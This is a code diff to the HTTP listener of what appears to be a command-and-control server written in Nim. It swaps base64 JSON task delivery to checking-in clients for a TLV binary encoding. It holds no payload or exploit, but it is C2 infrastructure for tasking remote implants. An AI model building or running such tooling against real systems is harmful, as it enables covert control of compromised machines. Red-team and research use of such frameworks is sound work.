@@ -3,12 +3,12 @@ import std/[
   asynchttpserver, 
   asyncfutures, 
   strutils, 
-  json, 
-  base64, 
   times
 ]
 
-import ../types, ../logging, ../processMessage, ../events, ../../utils
+import ../types, ../logging, ../processMessage, ../events, ../../utils, ../tasks
+
+import tlv
 
 proc createNewHttpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
   let ipAddress = instance.ipAddress
@@ -54,17 +54,24 @@ proc createNewHttpListener*(server: C2Server, instance: ListenerInstance) {.asyn
           await req.respond(Http400, "error", headers.newHttpHeaders())
       elif req.reqMethod == HttpGet:
         client.lastCheckin = now()
-        var j: JsonNode = %*[]
+        onClientCheckin(client[])
+        
+        var tasks: seq[Task]
+        
         for task in server.tasks:
           if task.status == TaskCreated and task.client == client[]:
             task.status = TaskNotCompleted
-            j.add %*{
-              "task": task.action,
-              "taskId": task.id,
-              "data": task.arguments
-            }
-        onClientCheckin(client[])
-        await req.respond(Http200, encode($j), headers.newHttpHeaders())
+            tasks.add task
+
+        let b = initBuilder()
+        b.addInt32(cast[int32](len tasks))
+        for task in tasks: b.addString(task.toTLV())
+
+        await req.respond(
+          Http200, 
+          b.encodeString(), 
+          headers.newHttpHeaders()
+        )
 
   httpServer.listen(port)
 
